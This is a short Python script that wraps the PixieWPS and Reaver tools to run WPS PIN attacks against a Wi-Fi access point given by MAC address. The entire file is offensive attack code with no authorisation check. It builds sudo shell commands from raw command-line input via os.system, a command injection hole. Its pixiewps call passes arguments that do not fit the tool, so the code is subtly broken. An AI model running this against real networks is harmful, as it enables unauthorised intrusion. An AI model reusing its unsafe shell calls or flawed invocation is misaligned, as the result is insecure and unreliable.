import os
import sys

def run_pixiewps(interface, target):
    print(f"Running PixieWPS on {target}...")
    os.system(f'sudo ./pixiewps/pixiewps -i {interface} -e {target}')

def run_reaver(interface, target):
    print(f"Running Reaver on {target}...")
    os.system(f'sudo reaver -i {interface} -b {target} -K 1 -vv')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 wifi_testing.py <interface> <target_mac>")
        sys.exit(1)

    interface = sys.argv[1]
    target_mac = sys.argv[2]

    run_pixiewps(interface, target_mac)
    run_reaver(interface, target_mac)
